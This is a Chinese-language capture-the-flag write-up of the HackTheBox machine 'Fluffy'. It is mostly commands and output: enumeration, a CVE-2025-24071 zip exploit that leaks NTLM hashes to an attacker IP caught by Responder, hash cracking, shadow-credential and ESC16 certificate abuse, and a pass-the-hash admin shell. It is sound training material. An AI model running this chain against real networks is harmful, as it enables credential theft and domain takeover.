{"pageProps":{"postData":{"id":"HackTheBoxSeason8 - Fluffy","contentHtml":"<h1>Season8 - Fluffy</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Fluffy\">https://app.hackthebox.com/machines/Fluffy</a> | <code>Windows</code> · <code>Easy</code></p>\n</blockquote>\n<p>**Machine Information：**As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!</p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜ nmap -sT -min-rate 5000 -p- 10.10.11.69       \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 00:53 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.69\nHost is up (0.15s latency).\nNot shown: 65524 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n636/tcp   open  ldapssl\n3269/tcp  open  globalcatLDAPssl\n9389/tcp  open  adws\n49667/tcp open  unknown\n49677/tcp open  unknown\n49695/tcp open  unknown\n49701/tcp open  unknown\n</code></pre>\n<p>这次的靶机依旧是没有<code>Web</code></p>\n<pre><code class=\"hljs language-bash\">➜ nmap -sT -A -T4 -O -p 53,139,445 10.10.11.69                                                                                                                               \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 00:59 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.69\nHost is up (0.16s latency).\n\nPORT    STATE SERVICE       VERSION\n53/tcp  open  domain        Simple DNS Plus\n139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds?\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019 (88%)\nAggressive OS guesses: Microsoft Windows Server 2019 (88%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   <span class=\"hljs-built_in\">date</span>: 2025-05-25T11:38:32\n|_  start_date: N/A\n|_clock-skew: 6h38m59s\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   183.42 ms 10.10.16.1\n2   183.81 ms 10.10.11.69\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 63.00 seconds\n\n</code></pre>\n<h2>信息收集</h2>\n<h3>SMB</h3>\n<p>测试凭据</p>\n<pre><code class=\"hljs language-bash\">➜ crackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990!\nSMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.69     445    DC01             [+] fluffy.htb\\j.fleischman:J0elTHEM4n1990! \n</code></pre>\n<p>枚举用户</p>\n<pre><code class=\"hljs language-bash\">➜  nxc smb fluffy.htb -u <span class=\"hljs-string\">'j.fleischman'</span> -p <span class=\"hljs-string\">'J0elTHEM4n1990!'</span> --rid-brute | grep <span class=\"hljs-string\">\"SidTypeUser\"</span> | awk -F <span class=\"hljs-string\">'\\\\'</span> <span class=\"hljs-string\">'{print $2}'</span> | awk <span class=\"hljs-string\">'{print $1}'</span> \nGuest\nkrbtgt\nDC01$\nca_svc\nldap_svc\np.agila\nwinrm_svc\nj.coffey\nj.fleischman\n</code></pre>\n<p><code>SMB</code> 信息收集</p>\n<pre><code class=\"hljs language-bash\">➜ smbclient -L 10.10.11.69 -U fluffy.htb/j.fleischman%J0elTHEM4n1990!\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        IT              Disk      \n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 <span class=\"hljs-keyword\">for</span> workgroup listing.\ndo_connect: Connection to 10.10.11.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜ smbclient //10.10.11.69/IT -U fluffy.htb/j.fleischman%J0elTHEM4n1990!\nTry <span class=\"hljs-string\">\"help\"</span> to get a list of possible commands.\nsmb: \\> <span class=\"hljs-built_in\">ls</span>\n  .                                   D        0  Sun May 25 08:21:54 2025\n  ..                                  D        0  Sun May 25 08:21:54 2025\n  0x5chltz.library-ms                 A      364  Sun May 25 08:13:39 2025\n  1.lnk                               A     2164  Sun May 25 07:59:46 2025\n  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025\n  Everything-1.4.1.1026.x64.zip       A      317  Sun May 25 08:06:27 2025\n  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025\n  KeePass-2.58.zip                    A      317  Sun May 25 08:06:16 2025\n  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025\n\n                5842943 blocks of size 4096. 1849449 blocks available\n</code></pre>\n<p><code>Upgrade_Notice.pdf</code> 像是渗透测试报告一样的东西</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image.png\" alt=\"image.png\"></p>\n<p>下边有披露的公开漏洞</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image1.png\" alt=\"image.png\"></p>\n<p>能看到有两个 <code>Critical</code> 漏洞以及两个 <code>High</code> 漏洞</p>\n<h3>CVE-2025-24071</h3>\n<p>对比了两个漏洞 <code>CVE-2025-24996</code> 和 <code>CVE-2025-24071</code></p>\n<p>其中 <code>CVE-2025-24996</code> 网上文章并不多，而 <code>CVE-2025-24071</code> 会有复现文章，所以侧重于 <code>CVE-2025-24071</code></p>\n<p>复现文章：<a href=\"https://blog.csdn.net/weixin_42773448/article/details/146436061\">https://blog.csdn.net/weixin_42773448/article/details/146436061</a></p>\n<p>工具：<a href=\"https://github.com/0x6rss/CVE-2025-24071_PoC\">https://github.com/0x6rss/CVE-2025-24071_PoC</a></p>\n<pre><code class=\"hljs language-bash\">➜  CVE-2025-24071_PoC git:(main) python poc.py \nEnter your file name: doc\nEnter IP (EX: 192.168.1.162): 10.10.16.16\ncompleted\n</code></pre>\n<p>上传到 <code>IT</code></p>\n<pre><code class=\"hljs language-bash\">smb: \\> put exploit.zip\nputting file exploit.zip as \\exploit.zip (0.8 kb/s) (average 0.8 kb/s)\n</code></pre>\n<p>同时开启<code>responder</code>监听</p>\n<pre><code class=\"hljs language-bash\">➜ responder -I tun0 -wd\n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR &#x26; MDNS Responder 3.1.5.0\n\n  To support this project:\n  Github -> https://github.com/sponsors/lgandx\n  Paypal  -> https://paypal.me/PythonResponder\n\n  Author: Laurent Gaffie (laurent.gaffie@gmail.com)\n  To <span class=\"hljs-built_in\">kill</span> this script hit CTRL-C\n</code></pre>\n<p>等一会能就接收到 <code>p.agila</code> 用户 <code>NET NTLM hash</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image2.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">p.agila::FLUFFY:56ab772ca1eae1e3:E1A831FDA20AA227AD2187ABCD5C3737:01010000000000008003A3D819CDDB010A2E54C0A8C85EC30000000002000800330037003200460001001E00570049004E002D0059005000570030004F00330051004D0053004500480004003400570049004E002D0059005000570030004F00330051004D005300450048002E0033003700320046002E004C004F00430041004C000300140033003700320046002E004C004F00430041004C000500140033003700320046002E004C004F00430041004C00070008008003A3D819CDDB01060004000200000008003000300000000000000001000000002000009850210C3B697422BCA38C6B2216E754DBFB52DA16AAC86C61528CEE298FC1640A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310036000000000000000000  \n</code></pre>\n<p>使用 <code>hashcat</code> 进行破解用户凭据</p>\n<pre><code class=\"hljs language-bash\">➜ hashcat -m 5600 <span class=\"hljs-string\">'xxxx'</span> /usr/share/wordlists/rockyou.txt \n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image3.png\" alt=\"image.png\"></p>\n<p>得到密码 <code>prometheusx-303</code></p>\n<p>测试凭据</p>\n<pre><code class=\"hljs language-bash\">➜ crackmapexec smb 10.10.11.69 -u p.agila -p prometheusx-303\nSMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.69     445    DC01             [+] fluffy.htb\\p.agila:prometheusx-303 \n</code></pre>\n<h3>BloodHound</h3>\n<p>这里使用 <code>BloodHound</code> 进行枚举域攻击路线</p>\n<pre><code class=\"hljs language-bash\">ntpdate -s 10.10.11.69 &#x26;&#x26; bloodhound-python -u <span class=\"hljs-string\">'p.agila'</span> -p <span class=\"hljs-string\">'prometheusx-303'</span> -d <span class=\"hljs-string\">'fluffy.htb'</span> -ns 10.10.11.69 --zip -c All -dc DC.fluffy.htb\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜ ntpdate -s 10.10.11.69 &#x26;&#x26; bloodhound-python -u <span class=\"hljs-string\">'p.agila'</span> -p <span class=\"hljs-string\">'prometheusx-303'</span> -d <span class=\"hljs-string\">'fluffy.htb'</span> -ns 10.10.11.69 --zip -c All -dc DC01.fluffy.htb\nINFO: Found AD domain: fluffy.htb\nINFO: Getting TGT <span class=\"hljs-keyword\">for</span> user\nINFO: Connecting to LDAP server: DC01.fluffy.htb\nINFO: Found 1 domains\nINFO: Found 1 domains <span class=\"hljs-keyword\">in</span> the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC01.fluffy.htb\nINFO: Found 10 <span class=\"hljs-built_in\">users</span>\nINFO: Found 54 <span class=\"hljs-built_in\">groups</span>\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC01.fluffy.htb\nINFO: Done <span class=\"hljs-keyword\">in</span> 00M 24S\nINFO: Compressing output into 20250525091352_bloodhound.zip\n</code></pre>\n<p>用户 <code>p.agila</code> 属于 <code>SERVICE ACCOUNT MANGERS</code> 和 <code>SERVICE ACCOUNTS</code> 组，其中<code>SERVICE ACCOUNT MANGERS</code> 对 <code>SERVICE ACCOUNTS</code> 组有 <code>GenericAll</code> 权限</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image4.png\" alt=\"image.png\"></p>\n<p>然后远程服务用户 <code>WINRM_SVC</code> 等也是在 <code>SERVICE ACCOUNTS</code> 组内</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image5.png\" alt=\"image.png\"></p>\n<h2>域渗透</h2>\n<h3>To Winrm_svc</h3>\n<p>可以使用 <code>GetUserSPNs</code> 获取服务用户 <code>HASH</code> 来进行破解</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image6.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image7.png\" alt=\"image.png\"></p>\n<p>但是并无法破解成功，服务账户密码都是随机的…</p>\n<p>影子用户(<code>Shadow Credential Attack</code>)启动</p>\n<pre><code class=\"hljs language-bash\">➜ certipy shadow auto -username <span class=\"hljs-string\">\"p.agila@fluffy.htb\"</span> -p <span class=\"hljs-string\">\"prometheusx-303\"</span> -account WINRM_SVC -dc-ip 10.10.11.69\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image8.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">➜ <span class=\"hljs-built_in\">export</span> KRB5CCNAME=winrm_svc.ccache \n</code></pre>\n<p><code>evil-winrm</code> 登录</p>\n<pre><code class=\"hljs language-bash\">➜ evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class=\"hljs-keyword\">function</span> is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\winrm_svc\\Documents> \n</code></pre>\n<p><code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\winrm_svc\\Desktop> <span class=\"hljs-built_in\">type</span> user.txt\n9e23a6ed83a674306f7fad569aa292bb\n</code></pre>\n<h3>寻找攻击路线</h3>\n<p>继续寻找提权路线</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image9.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image10.png\" alt=\"image.png\"></p>\n<p>感觉还是要拿 <code>CA_SVC</code> 用户进行一些攻击，例如 <code>ADCS</code> 攻击，因为它是 <code>CA</code> 服务用户</p>\n<p>使用 <code>certipy</code> （这里需要对<code>certipy</code>进行更新，在这里卡了很久，愣是找不到攻击路径）枚举可能的漏洞信息</p>\n<pre><code class=\"hljs language-bash\">➜ certipy find -u <span class=\"hljs-string\">'ca_svc'</span> -hashes <span class=\"hljs-string\">':ca0f4f9e9eb8a092addf53bb03fc98c8'</span> -dc-ip 10.10.11.69 -vulnerable     \nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 33 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 11 enabled certificate templates\n[*] Finding issuance policies\n[*] Found 14 issuance policies\n[*] Found 0 OIDs linked to templates\n[*] Retrieving CA configuration <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'fluffy-DC01-CA'</span> via RRP\n[*] Successfully retrieved CA configuration <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'fluffy-DC01-CA'</span>\n[*] Checking web enrollment <span class=\"hljs-keyword\">for</span> CA <span class=\"hljs-string\">'fluffy-DC01-CA'</span> @ <span class=\"hljs-string\">'DC01.fluffy.htb'</span>\n[!] Error checking web enrollment: timed out\n[!] Use -debug to <span class=\"hljs-built_in\">print</span> a stacktrace\n[!] Error checking web enrollment: timed out\n[!] Use -debug to <span class=\"hljs-built_in\">print</span> a stacktrace\n[*] Saving text output to <span class=\"hljs-string\">'20250525110326_Certipy.txt'</span>\n[*] Wrote text output to <span class=\"hljs-string\">'20250525110326_Certipy.txt'</span>\n[*] Saving JSON output to <span class=\"hljs-string\">'20250525110326_Certipy.json'</span>\n[*] Wrote JSON output to <span class=\"hljs-string\">'20250525110326_Certipy.json'</span>\n\n</code></pre>\n<p>存在 <code>ESC16</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Fluffy/image11.png\" alt=\"image.png\"></p>\n<h3>ESC16</h3>\n<p>利用链接：<a href=\"https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally\">https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally</a></p>\n<p>影子用户获取 <code>CA_SVC</code> 的 <code>NT hash</code></p>\n<pre><code class=\"hljs language-bash\">➜ certipy shadow auto -username <span class=\"hljs-string\">\"p.agila@fluffy.htb\"</span> -p <span class=\"hljs-string\">\"prometheusx-303\"</span> -account CA_SVC -dc-ip 10.10.11.69\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Targeting user <span class=\"hljs-string\">'ca_svc'</span>\n[*] Generating certificate\n[*] Certificate generated\n[*] Generating Key Credential\n[*] Key Credential generated with DeviceID <span class=\"hljs-string\">'7f0851e9-35c3-eccb-fd92-b35465aa5f94'</span>\n[*] Adding Key Credential with device ID <span class=\"hljs-string\">'7f0851e9-35c3-eccb-fd92-b35465aa5f94'</span> to the Key Credentials <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'ca_svc'</span>\n[*] Successfully added Key Credential with device ID <span class=\"hljs-string\">'7f0851e9-35c3-eccb-fd92-b35465aa5f94'</span> to the Key Credentials <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'ca_svc'</span>\n[*] Authenticating as <span class=\"hljs-string\">'ca_svc'</span> with the certificate\n[*] Using principal: ca_svc@fluffy.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to <span class=\"hljs-string\">'ca_svc.ccache'</span>\n[*] Trying to retrieve NT <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'ca_svc'</span>\n[*] Restoring the old Key Credentials <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'ca_svc'</span>\n[*] Successfully restored the old Key Credentials <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'ca_svc'</span>\n[*] NT <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'ca_svc'</span>: ca0f4f9e9eb8a092addf53bb03fc98c8\n</code></pre>\n<p>下面跟着利用链接的做即可</p>\n<pre><code class=\"hljs language-bash\">➜ certipy account -u <span class=\"hljs-string\">'ca_svc'</span> -hashes <span class=\"hljs-string\">':ca0f4f9e9eb8a092addf53bb03fc98c8'</span> -dc-ip 10.10.11.69 -user <span class=\"hljs-string\">'ca_svc'</span> <span class=\"hljs-built_in\">read</span>\n\n[*] Reading attributes <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'ca_svc'</span>:\n    cn                                  : certificate authority service\n    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb\n    name                                : certificate authority service\n    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103\n    sAMAccountName                      : ca_svc\n    servicePrincipalName                : ADCS/ca.fluffy.htb\n    userPrincipalName                   : ca_svc@fluffy.htb\n    userAccountControl                  : 66048\n    whenCreated                         : 2025-04-17T16:07:50+00:00\n    whenChanged                         : 2025-05-25T14:57:02+00:00\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜ ntpdate -s 10.10.11.69 &#x26;&#x26; certipy-ad account -u <span class=\"hljs-string\">'ca_svc'</span> -hashes <span class=\"hljs-string\">':ca0f4f9e9eb8a092addf53bb03fc98c8'</span> -dc-ip 10.10.11.69 -upn <span class=\"hljs-string\">'administrator@fluffy.htb'</span> -user <span class=\"hljs-string\">'ca_svc'</span> update\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Updating user <span class=\"hljs-string\">'ca_svc'</span>:\n    userPrincipalName                   : administrator@fluffy.htb\n[*] Successfully updated <span class=\"hljs-string\">'ca_svc'</span>\n\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜ certipy req -u <span class=\"hljs-string\">'ca_svc'</span> -hashes <span class=\"hljs-string\">':ca0f4f9e9eb8a092addf53bb03fc98c8'</span> -dc-ip 10.10.11.69 -target <span class=\"hljs-string\">'DC01.fluffy.htb'</span> -ca <span class=\"hljs-string\">'fluffy-DC01-CA'</span> -template <span class=\"hljs-string\">'User'</span>\n\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Request ID is 43\n[*] Successfully requested certificate\n[*] Got certificate with UPN <span class=\"hljs-string\">'administrator@fluffy.htb'</span>\n[*] Certificate has no object SID\n[*] Try using -sid to <span class=\"hljs-built_in\">set</span> the object SID or see the wiki <span class=\"hljs-keyword\">for</span> more details\n[*] Saving certificate and private key to <span class=\"hljs-string\">'administrator.pfx'</span>\n[*] Wrote certificate and private key to <span class=\"hljs-string\">'administrator.pfx'</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜ ntpdate -s 10.10.11.69 &#x26;&#x26; certipy-ad account -u <span class=\"hljs-string\">'ca_svc'</span> -hashes <span class=\"hljs-string\">':ca0f4f9e9eb8a092addf53bb03fc98c8'</span> -dc-ip 10.10.11.69 -upn <span class=\"hljs-string\">'ca_svc@fluffy.htb'</span> -user <span class=\"hljs-string\">'ca_svc'</span> update\n\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Updating user <span class=\"hljs-string\">'ca_svc'</span>:\n    userPrincipalName                   : ca_svc@fluffy.htb\n[*] Successfully updated <span class=\"hljs-string\">'ca_svc'</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜ certipy auth -pfx administrator.pfx -username <span class=\"hljs-string\">'administrator'</span> -domain <span class=\"hljs-string\">'fluffy.htb'</span> -dc-ip 10.10.11.69                                                                                                   \nCertipy v5.0.2 - by Oliver Lyak (ly4k)      \n                                                                                                                                                                                                                  \n[*] Certificate identities:                                                                                                                                                                                       \n[*]     SAN UPN: <span class=\"hljs-string\">'administrator@fluffy.htb'</span>                                                              \n[*] Using principal: <span class=\"hljs-string\">'administrator@fluffy.htb'</span>                                                                                                                                                                   \n[*] Trying to get TGT...                                                                                                                                                                                          \n[*] Got TGT\n[*] Saving credential cache to <span class=\"hljs-string\">'administrator.ccache'</span>\n[*] Wrote credential cache to <span class=\"hljs-string\">'administrator.ccache'</span> \n[*] Trying to retrieve NT <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'administrator'</span>\n[*] Got <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'administrator@fluffy.htb'</span>: aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜ psexec.py fluffy.htb/administrator@10.10.11.69 -hashes aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on 10.10.11.69.....\n[*] Found writable share ADMIN$\n[*] Uploading file VJlmOeTb.exe\n[*] Opening SVCManager on 10.10.11.69.....\n[*] Creating service trya on 10.10.11.69.....\n[*] Starting service trya.....\n[!] Press <span class=\"hljs-built_in\">help</span> <span class=\"hljs-keyword\">for</span> extra shell commands\nMicrosoft Windows [Version 10.0.17763.6893]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> \n\n</code></pre>\n<pre><code class=\"hljs language-bash\">C:\\Users\\Administrator\\Desktop> <span class=\"hljs-built_in\">type</span> root.txt\n03337de6b0f0f5188a76c3970006b97b\n</code></pre>\n<h2>总结</h2>\n<p>CVE-2025-24071，ADCS，ESC16，NTLM 中继</p>","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","updated":"2025-05-25","tags":["HackTheBox","Windows","ADCS","ESC16","responder"],"categories":"靶机","comments":true,"description":"Season8 - Fluffy\n\n https://app.hackthebox.com/machines/Fluffy | `Windows` · `Easy`\n \n\nMachine Information：As is common in real life Windows pentests, you will start the Fluffy box with credentials for..."}},"__N_SSG":true}